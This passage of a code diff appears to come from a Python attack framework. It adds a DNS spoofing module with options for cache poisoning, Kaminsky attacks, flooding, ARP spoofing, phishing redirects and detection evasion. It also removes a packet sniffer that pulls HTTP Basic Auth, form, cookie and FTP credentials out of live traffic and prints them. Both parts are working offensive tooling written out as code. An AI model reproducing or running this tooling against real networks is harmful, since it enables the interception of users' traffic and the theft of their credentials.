+                    'truncate_responses': self._parse_bool(self.module_options.get('truncate_responses', 'false')),
+                    'empty_response': self._parse_bool(self.module_options.get('empty_response', 'false')),
+                    'nxdomain_response': self._parse_bool(self.module_options.get('nxdomain_response', 'false')),
+                    'servfail_response': self._parse_bool(self.module_options.get('servfail_response', 'false')),
+                    
+                    # Traffic analysis
+                    'log_queries': self._parse_bool(self.module_options.get('log_queries', 'true')),
+                    'log_responses': self._parse_bool(self.module_options.get('log_responses', 'true')),
+                    'log_spoofed_only': self._parse_bool(self.module_options.get('log_spoofed_only', 'false')),
+                    'query_statistics': self._parse_bool(self.module_options.get('query_statistics', 'true')),
+                    'track_clients': self._parse_bool(self.module_options.get('track_clients', 'true')),
+                    'identify_tools': self._parse_bool(self.module_options.get('identify_tools', 'true')),
+                    'detect_tunneling': self._parse_bool(self.module_options.get('detect_tunneling', 'false')),
+                    'anomaly_detection': self._parse_bool(self.module_options.get('anomaly_detection', 'false')),
+                    
+                    # Attack techniques
+                    'cache_poisoning': self._parse_bool(self.module_options.get('cache_poisoning', 'false')),
+                    'birthday_attack': self._parse_bool(self.module_options.get('birthday_attack', 'false')),
+                    'kaminsky_attack': self._parse_bool(self.module_options.get('kaminsky_attack', 'false')),
+                    'response_flooding': self._parse_bool(self.module_options.get('response_flooding', 'false')),
+                    'query_flooding': self._parse_bool(self.module_options.get('query_flooding', 'false')),
+                    'amplification_mode': self._parse_bool(self.module_options.get('amplification_mode', 'false')),
+                    'fast_flux': self._parse_bool(self.module_options.get('fast_flux', 'false')),
+                    
+                    # Evasion & stealth
+                    'stealth_mode': self._parse_bool(self.module_options.get('stealth_mode', 'false')),
+                    'random_txid': self._parse_bool(self.module_options.get('random_txid', 'true')),
+                    'vary_ttl': self._parse_bool(self.module_options.get('vary_ttl', 'false')),
+                    'mimic_upstream': self._parse_bool(self.module_options.get('mimic_upstream', 'true')),
+                    'delay_responses': self._parse_bool(self.module_options.get('delay_responses', 'false')),
+                    'response_delay_ms': int(self.module_options.get('response_delay_ms', '0')),
+                    'jitter': self._parse_bool(self.module_options.get('jitter', 'false')),
+                    'avoid_detection': self._parse_bool(self.module_options.get('avoid_detection', 'false')),
+                    
+                    # Integration
+                    'mitm_required': self._parse_bool(self.module_options.get('mitm_required', 'true')),
+                    'auto_arp_spoof': self._parse_bool(self.module_options.get('auto_arp_spoof', 'false')),
+                    'target_gateway': str(self.module_options.get('target_gateway', '')),
+                    'phishing_mode': self._parse_bool(self.module_options.get('phishing_mode', 'false')),
+                    'redirect_to_server': str(self.module_options.get('redirect_to_server', '')),
+                    'clone_legitimate': self._parse_bool(self.module_options.get('clone_legitimate', 'false')),
+                    
+                    # Filtering
+                    'filter_query_types': str(self.module_options.get('filter_query_types', '')),
+                    'block_domains': str(self.module_options.get('block_domains', '')),
+                    'allow_domains': str(self.module_options.get('allow_domains', '')),
+                    'block_tlds': str(self.module_options.get('block_tlds', '')),
+                    'geographic_filter': self._parse_bool(self.module_options.get('geographic_filter', 'false')),
+                    'asn_filter': str(self.module_options.get('asn_filter', '')),
+                    
+                    # Database & logging
+                    'enable_database': self._parse_bool(self.module_options.get('enable_database', 'true')),
+                    'db_file': str(self.module_options.get('db_file', 'dns_spoof.db')),
+                    'log_file': str(self.module_options.get('log_file', 'dns_spoof.log')),
+                    'log_level': str(self.module_options.get('log_level', 'info')),
+                    'log_format': str(self.module_options.get('log_format', 'detailed')),
+                    'log_rotation': self._parse_bool(self.module_options.get('log_rotation', 'true')),
+                    'max_log_size': int(self.module_options.get('max_log_size', '100')),
+                    'pcap_output': str(self.module_options.get('pcap_output', '')),
+                    
+                    # Performance
+                    'threads': int(self.module_options.get('threads', '4')),
+                    'queue_size': int(self.module_options.get('queue_size', '1000')),
+                    'max_clients': int(self.module_options.get('max_clients', '100')),
+                    'rate_limit': int(self.module_options.get('rate_limit', '100')),
+                    'burst_limit': int(self.module_options.get('burst_limit', '500')),
+                    'connection_timeout': int(self.module_options.get('connection_timeout', '30')),
+                    'buffer_size': int(self.module_options.get('buffer_size', '4096')),
+                    'async_processing': self._parse_bool(self.module_options.get('async_processing', 'true')),
+                    
+                    # Reporting
+                    'generate_report': self._parse_bool(self.module_options.get('generate_report', 'true')),
+                    'report_format': str(self.module_options.get('report_format', 'all')),
+                    'report_interval': int(self.module_options.get('report_interval', '60')),
+                    'include_statistics': self._parse_bool(self.module_options.get('include_statistics', 'true')),
+                    'include_top_domains': self._parse_bool(self.module_options.get('include_top_domains', 'true')),
+                    'include_clients': self._parse_bool(self.module_options.get('include_clients', 'true')),
+                    'visualize_data': self._parse_bool(self.module_options.get('visualize_data', 'false')),
+                    'export_to_splunk': self._parse_bool(self.module_options.get('export_to_splunk', 'false')),
+                    
+                    # Notifications
+                    'enable_alerts': self._parse_bool(self.module_options.get('enable_alerts', 'true')),
+                    'alert_on_spoof': self._parse_bool(self.module_options.get('alert_on_spoof', 'true')),
+                    'alert_on_cache_poison': self._parse_bool(self.module_options.get('alert_on_cache_poison', 'true')),
+                    'alert_on_tunneling': self._parse_bool(self.module_options.get('alert_on_tunneling', 'false')),
+                    'alert_method': str(self.module_options.get('alert_method', 'console')),
+                    'webhook_url': str(self.module_options.get('webhook_url', '')),
+                    'email_to': str(self.module_options.get('email_to', '')),
+                    'syslog_server': str(self.module_options.get('syslog_server', '')),
+                    
+                    # Safety
+                    'dry_run': self._parse_bool(self.module_options.get('dry_run', 'false')),
+                    'test_mode': self._parse_bool(self.module_options.get('test_mode', 'false')),
+                    'interactive': self._parse_bool(self.module_options.get('interactive', 'false')),
+                    'confirm_spoof': self._parse_bool(self.module_options.get('confirm_spoof', 'true')),
+                    'auto_stop_timer': int(self.module_options.get('auto_stop_timer', '0')),
+                    'max_spoofs': int(self.module_options.get('max_spoofs', '0')),
+                    'backup_dns': self._parse_bool(self.module_options.get('backup_dns', 'true')),
+                    'restore_on_exit': self._parse_bool(self.module_options.get('restore_on_exit', 'true'))
+                }
+                
+                return config
+            except Exception as e:
+                print(f"Error loading config: {str(e)}")
+                return None
+    
+    
+        def _display_dns_spoof_config(self, config):
+            """Display DNS spoof configuration"""
+            from colorama import Fore, Style
+            
+            print(f"{Fore.CYAN}{'=' * 70}")
+            print(f"  CONFIGURATION")
+            print(f"{'=' * 70}{Style.RESET_ALL}\n")
+            
+            print(f"{Fore.YELLOW}  Campaign:{Style.RESET_ALL}")
+            print(f"    • Name:            {Fore.WHITE}{config['campaign_name']}{Style.RESET_ALL}")
+            print(f"    • Interface:       {Fore.WHITE}{config['interface']}{Style.RESET_ALL}")
+            print(f"    • Listen Port:     {Fore.WHITE}{config['listen_port']}{Style.RESET_ALL}")
+            
+            print(f"\n{Fore.YELLOW}  Spoofing:{Style.RESET_ALL}")
+            print(f"    • Spoof IP:        {Fore.WHITE}{config['spoof_ip']}{Style.RESET_ALL}")
+            print(f"    • Wildcard Mode:   {Fore.GREEN if config['wildcard_mode'] else Fore.RED}{'✓' if config['wildcard_mode'] else '✗'}{Style.RESET_ALL}")
+            print(f"    • Response Type:   {Fore.WHITE}{config['response_type']}{Style.RESET_ALL}")
+            print(f"    • TTL:             {Fore.WHITE}{config['ttl']}s{Style.RESET_ALL}")
+            
+            print(f"\n{Fore.YELLOW}  Upstream DNS:{Style.RESET_ALL}")
+            print(f"    • Primary:         {Fore.WHITE}{config['upstream_dns']}{Style.RESET_ALL}")
+            print(f"    • Fallback:        {Fore.WHITE}{config['fallback_dns']}{Style.RESET_ALL}")
+            print(f"    • DoH:             {Fore.GREEN if config['dns_over_https'] else Fore.RED}{'✓' if config['dns_over_https'] else '✗'}{Style.RESET_ALL}")
+            
+            print(f"\n{Fore.YELLOW}  Cache:{Style.RESET_ALL}")
+            print(f"    • Enabled:         {Fore.GREEN if config['enable_cache'] else Fore.RED}{'✓' if config['enable_cache'] else '✗'}{Style.RESET_ALL}")
+            if config['enable_cache']:
+                print(f"    • Cache Size:      {Fore.WHITE}{config['cache_size']} entries{Style.RESET_ALL}")
+                print(f"    • Cache TTL:       {Fore.WHITE}{config['cache_ttl']}s{Style.RESET_ALL}")
+            
+            print(f"\n{Fore.YELLOW}  Database:{Style.RESET_ALL}")
+            print(f"    • Enabled:         {Fore.GREEN if config['enable_database'] else Fore.RED}{'✓' if config['enable_database'] else '✗'}{Style.RESET_ALL}")
+            if config['enable_database']:
+                print(f"    • DB File:         {Fore.WHITE}{config['db_file']}{Style.RESET_ALL}")
+            
+            print()
+    
+    
+        def _initialize_dns_database(self, config):
+            """Initialize SQLite database for DNS operations"""
+            import sqlite3
+            
+            conn = sqlite3.connect(config['db_file'])
+            cursor = conn.cursor()
+            
+            # Campaigns table
+            cursor.execute('''
+                CREATE TABLE IF NOT EXISTS campaigns (
                     id INTEGER PRIMARY KEY AUTOINCREMENT,
-                    campaign_id INTEGER NOT NULL,
-                    timestamp REAL NOT NULL,
-                    protocol TEXT NOT NULL,
-                    source_ip TEXT NOT NULL,
-                    filename TEXT,
-                    file_type TEXT,
-                    file_size INTEGER,
-                    file_hash TEXT,
-                    file_path TEXT,
+                    name TEXT NOT NULL,
+                    interface TEXT,
+                    start_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+                    end_time TIMESTAMP,
+                    queries_total INTEGER DEFAULT 0,
+                    queries_spoofed INTEGER DEFAULT 0,
+                    unique_clients INTEGER DEFAULT 0,
+                    status TEXT DEFAULT 'active'
+                )
+            ''')
+            
+            # DNS queries table
+            cursor.execute('''
+                CREATE TABLE IF NOT EXISTS dns_queries (
+                    id INTEGER PRIMARY KEY AUTOINCREMENT,
+                    campaign_id INTEGER,
+                    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+                    client_ip TEXT,
+                    query_domain TEXT,
+                    query_type TEXT,
+                    response_ip TEXT,
+                    spoofed BOOLEAN DEFAULT 0,
+                    ttl INTEGER,
+                    upstream_used TEXT,
+                    FOREIGN KEY (campaign_id) REFERENCES campaigns(id)
+                )
+            ''')
+            
+            # DNS responses table
+            cursor.execute('''
+                CREATE TABLE IF NOT EXISTS dns_responses (
+                    id INTEGER PRIMARY KEY AUTOINCREMENT,
+                    campaign_id INTEGER,
+                    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+                    query_domain TEXT,
+                    response_data TEXT,
+                    response_type TEXT,
+                    cached BOOLEAN DEFAULT 0,
+                    FOREIGN KEY (campaign_id) REFERENCES campaigns(id)
+                )
+            ''')
+            
+            # Clients table
+            cursor.execute('''
+                CREATE TABLE IF NOT EXISTS clients (
+                    id INTEGER PRIMARY KEY AUTOINCREMENT,
+                    campaign_id INTEGER,
+                    ip_address TEXT UNIQUE,
+                    first_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+                    last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+                    query_count INTEGER DEFAULT 0,
+                    tool_fingerprint TEXT,
                     FOREIGN KEY (campaign_id) REFERENCES campaigns(id)
                 )
             ''')
@@ -39883,1308 +37961,3230 @@ Success Rate:       {(leases/requests*100) if requests > 0 else 0:.1f}%
             cursor.execute('''
                 CREATE TABLE IF NOT EXISTS statistics (
                     id INTEGER PRIMARY KEY AUTOINCREMENT,
-                    campaign_id INTEGER NOT NULL,
-                    timestamp REAL NOT NULL,
-                    metric_name TEXT NOT NULL,
-                    metric_value REAL NOT NULL,
+                    campaign_id INTEGER,
+                    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+                    metric_name TEXT,
+                    metric_value INTEGER,
                     FOREIGN KEY (campaign_id) REFERENCES campaigns(id)
                 )
             ''')
             
-            # Create indexes for performance
-            cursor.execute('CREATE INDEX IF NOT EXISTS idx_packets_campaign ON packets(campaign_id)')
-            cursor.execute('CREATE INDEX IF NOT EXISTS idx_packets_timestamp ON packets(timestamp)')
-            cursor.execute('CREATE INDEX IF NOT EXISTS idx_flows_campaign ON flows(campaign_id)')
-            cursor.execute('CREATE INDEX IF NOT EXISTS idx_alerts_campaign ON alerts(campaign_id)')
-            cursor.execute('CREATE INDEX IF NOT EXISTS idx_alerts_type ON alerts(alert_type)')
-            cursor.execute('CREATE INDEX IF NOT EXISTS idx_credentials_campaign ON credentials(campaign_id)')
-            
             # Insert campaign record
             cursor.execute('''
-                INSERT INTO campaigns (name, interface, filter)
-                VALUES (?, ?, ?)
-            ''', (
-                f"Capture_{int(config['start_time'])}",
-                config['interface'],
-                config['bpf_filter'] or 'None'
-            ))
-            
-            config['campaign_id'] = cursor.lastrowid
+                INSERT INTO campaigns (name, interface)
+                VALUES (?, ?)
+            ''', (config['campaign_name'], config['interface']))
             
             conn.commit()
             conn.close()
-            
-            print(f"{Fore.GREEN}✓ Database initialized: {db_path}{Style.RESET_ALL}")
-            print(f"{Fore.GREEN}✓ Campaign ID: {config['campaign_id']}{Style.RESET_ALL}")
-            
-            return True
-            
-        except Exception as e:
-            print(f"{Fore.RED}✗ Database error: {str(e)}{Style.RESET_ALL}")
-            return False
     
-    def _validate_capture_interface(self, config):
-        """Validate network interface"""
-        from colorama import Fore, Style
-        import os
-        
-        try:
-            # Get available interfaces
-            from scapy.all import get_if_list, conf
-            
-            interfaces = get_if_list()
-            
-            if config['interface'] not in interfaces:
-                print(f"{Fore.RED}✗ Interface '{config['interface']}' not found{Style.RESET_ALL}")
-                print(f"\n{Fore.CYAN}Available interfaces:{Style.RESET_ALL}")
-                for iface in interfaces:
-                    print(f"  • {iface}")
-                return False
-            
-            print(f"{Fore.GREEN}✓ Interface '{config['interface']}' validated{Style.RESET_ALL}")
-            
-            # Display interface info
-            try:
-                from scapy.all import get_if_addr, get_if_hwaddr
-                ip_addr = get_if_addr(config['interface'])
-                mac_addr = get_if_hwaddr(config['interface'])
-                print(f"  IP:  {ip_addr}")
-                print(f"  MAC: {mac_addr}")
-            except Exception as e:
-                # Silently handle exception - consider logging in production
-                if hasattr(self, "debug") and getattr(self, "debug", False):
-                    print(f"[DEBUG] Exception: {e}")
-            
-            return True
-            
-        except Exception as e:
-            print(f"{Fore.RED}✗ Interface validation error: {str(e)}{Style.RESET_ALL}")
-            return False
     
-    def _setup_capture_environment(self, config):
-        """Setup capture environment"""
-        from colorama import Fore, Style
-        import os
-        
-        try:
-            # Create output directories
-            output_dir = os.path.dirname(config['pcap_file']) if '/' in config['pcap_file'] else '.'
-            if output_dir and not os.path.exists(output_dir):
-                os.makedirs(output_dir)
-            
-            # Create file extraction directory
-            if config['extract_files']:
-                files_dir = f"extracted_files_{int(config['start_time'])}"
-                if not os.path.exists(files_dir):
-                    os.makedirs(files_dir)
-                config['files_dir'] = files_dir
-                print(f"{Fore.GREEN}✓ File extraction directory: {files_dir}{Style.RESET_ALL}")
-            
-            print(f"{Fore.GREEN}✓ Capture environment ready{Style.RESET_ALL}")
-            return True
-            
-        except Exception as e:
-            print(f"{Fore.RED}✗ Setup error: {str(e)}{Style.RESET_ALL}")
-            return False
+        def _initialize_dns_cache(self, config):
+            """Initialize DNS cache"""
+            self.dns_cache = {}
+            self.cache_timestamps = {}
+            self.cache_hits = 0
+            self.cache_misses = 0
     
-    def _display_capture_plan(self, config):
-        """Display capture plan"""
-        from colorama import Fore, Style
-        
-        print(f"\n{Fore.CYAN}{'=' * 80}{Style.RESET_ALL}")
-        print(f"{Fore.CYAN}CAPTURE PLAN{Style.RESET_ALL}")
-        print(f"{Fore.CYAN}{'=' * 80}{Style.RESET_ALL}\n")
-        
-        print(f"{Fore.YELLOW}Capture Target:{Style.RESET_ALL}")
-        print(f"  • Interface: {config['interface']}")
-        print(f"  • Filter: {config['bpf_filter'] or 'All traffic'}")
-        
-        if config['packet_count'] > 0:
-            print(f"  • Limit: {config['packet_count']} packets")
-        elif config['capture_duration'] > 0:
-            print(f"  • Duration: {config['capture_duration']} seconds")
-        else:
-            print(f"  • Duration: Until interrupted (Ctrl+C)")
-        
-        print(f"\n{Fore.YELLOW}Active Features:{Style.RESET_ALL}")
-        features = []
-        if config['deep_inspection']:
-            features.append("Deep Packet Inspection")
-        if config['extract_credentials']:
-            features.append("Credential Extraction")
-        if config['enable_anomaly_detection']:
-            features.append("Anomaly Detection")
-        if config['extract_files']:
-            features.append("File Extraction")
-        if config['traffic_statistics']:
-            features.append("Traffic Statistics")
-        
-        for feature in features:
-            print(f"  • {feature}")
-        
-        print(f"\n{Fore.YELLOW}Output:{Style.RESET_ALL}")
-        if config['output_pcap']:
-            print(f"  • PCAP: {config['pcap_file']}")
-        if config['output_json']:
-            print(f"  • JSON: {config['json_file']}")
-        if config['enable_database']:
-            print(f"  • Database: {config['db_file']}")
     
-    def _execute_packet_capture(self, config):
-        """Execute packet capture with real-time analysis"""
-        from colorama import Fore, Style
-        from scapy.all import sniff, wrpcap
-        import threading
-        import time
-        import queue
-        
-        # Packet queue for async processing
-        packet_queue = queue.Queue(maxsize=config['packet_queue_size'])
-        captured_packets = []
-        
-        # Statistics tracking
-        stats = {
-            'packets_by_protocol': {},
-            'packets_by_port': {},
-            'top_talkers': {},
-            'start_time': time.time(),
-            'last_display': time.time()
-        }
-        
-        # Display lock
-        display_lock = threading.Lock()
-        
-        def packet_handler(packet):
-            """Handle each captured packet"""
-            try:
-                # Add to queue for processing
-                if config['async_processing']:
-                    try:
-                        packet_queue.put(packet, block=False)
-                    except queue.Full:
-                        # Packet queue full - dropping packet (expected under high load)
-                        return  # Skip this packet
-                else:
-                    # Process immediately
-                    self._process_packet(packet, config, stats, display_lock)
-                
-                # Store for PCAP output
-                if config['output_pcap']:
-                    captured_packets.append(packet)
-                
-                config['packets_captured'] += 1
-                
-                # Check packet count limit
-                if config['packet_count'] > 0 and config['packets_captured'] >= config['packet_count']:
-                    config['stop_flag'] = True
-                    return True  # Stop sniffing
-                
-            except Exception as e:
-                if config['debug_mode']:
-                    print(f"{Fore.RED}✗ Packet handler error: {str(e)}{Style.RESET_ALL}")
-        
-        def packet_processor():
-            """Background packet processor thread"""
-            while not config['stop_flag']:
+        def _load_spoof_domains(self, config):
+            """Load domains to spoof"""
+            domains = []
+            
+            # Load from config string
+            if config['spoof_domains']:
+                domains.extend([d.strip() for d in config['spoof_domains'].split(',')])
+            
+            # Load from file
+            if config['domain_file']:
                 try:
-                    packet = packet_queue.get(timeout=1)
-                    self._process_packet(packet, config, stats, display_lock)
-                    packet_queue.task_done()
-                except queue.Empty:
-                    continue
-                except Exception as e:
-                    if config['debug_mode']:
-                        print(f"{Fore.RED}✗ Processor error: {str(e)}{Style.RESET_ALL}")
-        
-        def stats_display():
-            """Display statistics periodically"""
-            while not config['stop_flag']:
-                time.sleep(config['display_interval'])
-                if config['realtime_display']:
-                    self._display_statistics(config, stats, display_lock)
-        
-        def duration_monitor():
-            """Monitor capture duration"""
-            if config['capture_duration'] > 0:
-                time.sleep(config['capture_duration'])
-                config['stop_flag'] = True
-        
-        # Start background threads
-        threads = []
-        
-        if config['async_processing'] and config['use_threading']:
-            for i in range(config['thread_pool_size']):
-                t = threading.Thread(target=packet_processor, daemon=True)
-                t.start()
-                threads.append(t)
-        
-        if config['realtime_display']:
-            stats_thread = threading.Thread(target=stats_display, daemon=True)
-            stats_thread.start()
-            threads.append(stats_thread)
-        
-        if config['capture_duration'] > 0:
-            duration_thread = threading.Thread(target=duration_monitor, daemon=True)
-            duration_thread.start()
-            threads.append(duration_thread)
-        
-        # Start capture
-        print(f"{Fore.GREEN}🟢 Capture started - Press Ctrl+C to stop{Style.RESET_ALL}\n")
-        
-        try:
-            # Build filter
-            bpf_filter = config['bpf_filter'] if config['bpf_filter'] else None
-            
-            # Start sniffing
-            sniff(
-                iface=config['interface'],
-                prn=packet_handler,
-                filter=bpf_filter,
-                store=False,
-                stop_filter=lambda p: config['stop_flag']
-            )
-            
-        except Exception as e:
-            print(f"\n{Fore.RED}✗ Capture error: {str(e)}{Style.RESET_ALL}")
-        
-        finally:
-            # Signal threads to stop
-            config['stop_flag'] = True
-            
-            # Wait for queue to empty
-            if config['async_processing']:
-                packet_queue.join()
-            
-            # Save PCAP file
-            if config['output_pcap'] and captured_packets:
-                print(f"\n{Fore.CYAN}Saving PCAP file...{Style.RESET_ALL}")
-                wrpcap(config['pcap_file'], captured_packets)
-                print(f"{Fore.GREEN}✓ PCAP saved: {config['pcap_file']} ({len(captured_packets)} packets){Style.RESET_ALL}")
-    
-    def _process_packet(self, packet, config, stats, display_lock):
-        """Process individual packet"""
-        from colorama import Fore, Style
-        from scapy.all import IP, TCP, UDP, ICMP, Raw, ARP, DNS
-        import time
-        
-        try:
-            timestamp = time.time()
-            
-            # Extract basic info
-            src_ip = None
-            dst_ip = None
-            src_port = None
-            dst_port = None
-            protocol = None
-            payload = None
-            
-            # IP Layer
-            if IP in packet:
-                src_ip = packet[IP].src
-                dst_ip = packet[IP].dst
-                protocol = packet[IP].proto
-                
-                # Update statistics
-                with display_lock:
-                    stats['top_talkers'][src_ip] = stats['top_talkers'].get(src_ip, 0) + 1
-                
-                # TCP Layer
-                if TCP in packet:
-                    src_port = packet[TCP].sport
-                    dst_port = packet[TCP].dport
-                    protocol = 'TCP'
-                    
-                    with display_lock:
-                        port_key = f"TCP/{dst_port}"
-                        stats['packets_by_port'][port_key] = stats['packets_by_port'].get(port_key, 0) + 1
-                    
-                    # Deep inspection
-                    if config['deep_inspection']:
-                        self._inspect_tcp_packet(packet, config, src_ip, dst_ip, src_port, dst_port)
-                
-                # UDP Layer
-                elif UDP in packet:
-                    src_port = packet[UDP].sport
-                    dst_port = packet[UDP].dport
-                    protocol = 'UDP'
-                    
-                    with display_lock:
-                        port_key = f"UDP/{dst_port}"
-                        stats['packets_by_port'][port_key] = stats['packets_by_port'].get(port_key, 0) + 1
-                    
-                    # Deep inspection
-                    if config['deep_inspection']:
-                        self._inspect_udp_packet(packet, config, src_ip, dst_ip, src_port, dst_port)
-                
-                # ICMP Layer
-                elif ICMP in packet:
-                    protocol = 'ICMP'
-                
-                # Extract payload
-                if Raw in packet and config['payload_analysis']:
-                    payload = bytes(packet[Raw].load)
-            
-            # ARP Layer
-            elif ARP in packet:
-                protocol = 'ARP'
-                src_ip = packet[ARP].psrc
-                dst_ip = packet[ARP].pdst
-                
-                # Detect ARP spoofing
-                if config['detect_arp_spoof']:
-                    self._detect_arp_spoof(packet, config)
-            
-            # Update protocol statistics
-            if protocol:
-                with display_lock:
-                    stats['packets_by_protocol'][protocol] = stats['packets_by_protocol'].get(protocol, 0) + 1
-            
-            # Store in database
-            if config['enable_database'] and config['store_packets']:
-                self._store_packet(config, timestamp, src_ip, dst_ip, src_port, dst_port, protocol, len(packet), payload)
-            
-            # Display packet
-            if config['realtime_display'] and config['display_mode'] == 'detailed':
-                self._display_packet(packet, src_ip, dst_ip, src_port, dst_port, protocol, display_lock)
-            
-        except Exception as e:
-            if config['debug_mode']:
-                print(f"{Fore.RED}✗ Packet processing error: {str(e)}{Style.RESET_ALL}")
-    
-    def _inspect_tcp_packet(self, packet, config, src_ip, dst_ip, src_port, dst_port):
-        """Inspect TCP packet for protocols and patterns"""
-        from scapy.all import Raw
-        
-        try:
-            if not Raw in packet:
-                return
-            
-            payload = bytes(packet[Raw].load)
-            payload_str = payload.decode('utf-8', errors='ignore')
-            
-            # HTTP Analysis
-            if config['analyze_http'] and (dst_port == 80 or src_port == 80):
-                if payload_str.startswith(('GET ', 'POST ', 'PUT ', 'DELETE ', 'HEAD ', 'OPTIONS ')):
-                    self._analyze_http_request(packet, config, src_ip, dst_ip, payload_str)
-                elif payload_str.startswith('HTTP/'):
-                    self._analyze_http_response(packet, config, src_ip, dst_ip, payload_str)
-            
-            # HTTPS/TLS Analysis
-            if config['analyze_https'] and (dst_port == 443 or src_port == 443):
-                self._analyze_tls_packet(packet, config, src_ip, dst_ip, payload)
-            
-            # FTP Analysis
-            if config['analyze_ftp'] and (dst_port == 21 or src_port == 21):
-                self._analyze_ftp_packet(packet, config, src_ip, dst_ip, payload_str)
-            
-            # SMTP Analysis
-            if config['analyze_smtp'] and (dst_port == 25 or src_port == 25 or dst_port == 587):
-                self._analyze_smtp_packet(packet, config, src_ip, dst_ip, payload_str)
-            
-            # SSH Analysis
-            if config['analyze_ssh'] and (dst_port == 22 or src_port == 22):
-                self._analyze_ssh_packet(packet, config, src_ip, dst_ip, payload)
-            
-            # Telnet Analysis
-            if config['analyze_telnet'] and (dst_port == 23 or src_port == 23):
-                self._analyze_telnet_packet(packet, config, src_ip, dst_ip, payload_str)
-            
-            # SMB Analysis
-            if config['analyze_smb'] and (dst_port == 445 or src_port == 445):
-                self._analyze_smb_packet(packet, config, src_ip, dst_ip, payload)
-            
-            # RDP Analysis
-            if config['analyze_rdp'] and (dst_port == 3389 or src_port == 3389):
-                self._analyze_rdp_packet(packet, config, src_ip, dst_ip, payload)
-            
-            # Pattern matching
-            if config['enable_pattern_matching']:
-                self._match_patterns(packet, config, payload_str)
-            
-        except Exception as e:
-            if config['debug_mode']:
-                print(f"TCP inspection error: {str(e)}")
-    
-    def _inspect_udp_packet(self, packet, config, src_ip, dst_ip, src_port, dst_port):
-        """Inspect UDP packet"""
-        from scapy.all import DNS, Raw
-        
-        try:
-            # DNS Analysis
-            if DNS in packet and config['analyze_dns']:
-                self._analyze_dns_packet(packet, config, src_ip, dst_ip)
-            
-            # Check for DNS tunneling
-            if config['detect_dns_tunnel'] and DNS in packet:
-                self._detect_dns_tunnel(packet, config, src_ip)
-            
-        except Exception as e:
-            if config['debug_mode']:
-                print(f"UDP inspection error: {str(e)}")
-    
-    def _analyze_http_request(self, packet, config, src_ip, dst_ip, payload):
-        """Analyze HTTP request"""
-        from colorama import Fore, Style
-        import re
-        import time
-        
-        try:
-            lines = payload.split('\n')
-            if not lines:
-                return
-            
-            # Parse request line
-            request_line = lines[0]
-            method = request_line.split()[0] if len(request_line.split()) > 0 else ''
-            path = request_line.split()[1] if len(request_line.split()) > 1 else ''
-            
-            # Parse headers
-            headers = {}
-            for line in lines[1:]:
-                if ':' in line:
-                    key, value = line.split(':', 1)
-                    headers[key.strip().lower()] = value.strip()
-            
-            host = headers.get('host', '')
-            user_agent = headers.get('user-agent', '')
-            cookies = headers.get('cookie', '')
-            
-            # Extract credentials
-            if config['extract_credentials']:
-                # Basic Auth
-                if 'authorization' in headers:
-                    auth_header = headers['authorization']
-                    if auth_header.startswith('Basic '):
-                        import base64
-                        try:
-                            decoded = base64.b64decode(auth_header[6:]).decode('utf-8')
-                            if ':' in decoded:
-                                username, password = decoded.split(':', 1)
-                                self._store_credentials(config, 'HTTP-Basic', src_ip, dst_ip, username, password)
-                                print(f"\n{Fore.RED}🔐 HTTP BASIC AUTH: {username}:{password} from {src_ip}{Style.RESET_ALL}")
-                        except Exception as e:
-                            # Silently handle exception - consider logging in production
-                            if hasattr(self, "debug") and getattr(self, "debug", False):
-                                print(f"[DEBUG] Exception: {e}")
-                
-                # Form data
-                if method == 'POST' and len(lines) > len(headers) + 2:
-                    body = lines[-1]
-                    if 'username=' in body or 'password=' in body or 'email=' in body:
-                        self._extract_form_credentials(config, src_ip, dst_ip, body)
-            
-            # Extract cookies
-            if config['extract_cookies'] and cookies:
-                self._store_cookies(config, src_ip, host, cookies)
-            
-            # Store HTTP request in database
-            if config['enable_database']:
-                self._store_http_request(config, src_ip, method, host, path, user_agent, cookies)
-            
-            # Check for suspicious patterns
-            if config['detect_suspicious_traffic']:
-                self._check_http_suspicious(config, src_ip, method, path, headers)
-            
-        except Exception as e:
-            if config['debug_mode']:
-                print(f"HTTP analysis error: {str(e)}")
-    
-    def _analyze_http_response(self, packet, config, src_ip, dst_ip, payload):
-        """Analyze HTTP response"""
-        try:
-            # Extract Set-Cookie headers
-            if config['extract_cookies'] and 'Set-Cookie:' in payload:
-                lines = payload.split('\n')
-                for line in lines:
-                    if line.startswith('Set-Cookie:'):
-                        cookie = line.split(':', 1)[1].strip()
-                        self._store_cookies(config, dst_ip, '', cookie)
-        except Exception as e:
-            # Silently handle exception - consider logging in production
-            if hasattr(self, "debug") and getattr(self, "debug", False):
-                print(f"[DEBUG] Exception: {e}")
-    
-    def _analyze_dns_packet(self, packet, config, src_ip, dst_ip):
-        """Analyze DNS packet"""
-        from scapy.all import DNS, DNSQR, DNSRR
-        import time
-        
-        try:
-            if DNS in packet and packet[DNS].qr == 0:  # Query
-                query_name = packet[DNSQR].qname.decode('utf-8') if packet.haslayer(DNSQR) else ''
-                query_type = packet[DNSQR].qtype if packet.haslayer(DNSQR) else 0
-                
-                # Store DNS query
-                if config['enable_database']:
-                    self._store_dns_query(config, src_ip, query_name, query_type)
-            
-            elif DNS in packet and packet[DNS].qr == 1:  # Response
-                if packet.haslayer(DNSRR):
-                    for i in range(packet[DNS].ancount):
-                        dnsrr = packet[DNSRR][i] if packet[DNS].ancount > 1 else packet[DNSRR]
-                        response_ip = dnsrr.rdata if hasattr(dnsrr, 'rdata') else ''
-                        # Could store response
-        except Exception as e:
-            # Silently handle exception - consider logging in production
-            if hasattr(self, "debug") and getattr(self, "debug", False):
-                print(f"[DEBUG] Exception: {e}")
-    
-    def _analyze_ftp_packet(self, packet, config, src_ip, dst_ip, payload):
-        """Analyze FTP packet"""
-        from colorama import Fore, Style
-        
-        try:
-            if 'USER ' in payload and config['extract_ftp_creds']:
-                username = payload.split('USER ')[1].split('\r\n')[0]
-                # Store username, wait for PASS
-                if not hasattr(self, '_ftp_users'):
-                    self._ftp_users = {}
-                self._ftp_users[src_ip] = username
-            
-            elif 'PASS ' in payload and config['extract_ftp_creds']:
-                password = payload.split('PASS ')[1].split('\r\n')[0]
-                username = self._ftp_users.get(src_ip, 'unknown')
-                self._store_credentials(config, 'FTP', src_ip, dst_ip, username, password)
-                print(f"\n{Fore.RED}🔐 FTP CREDENTIALS: {username}:{password} from {src_ip}{Style.RESET_ALL}")
-        except Exception as e:
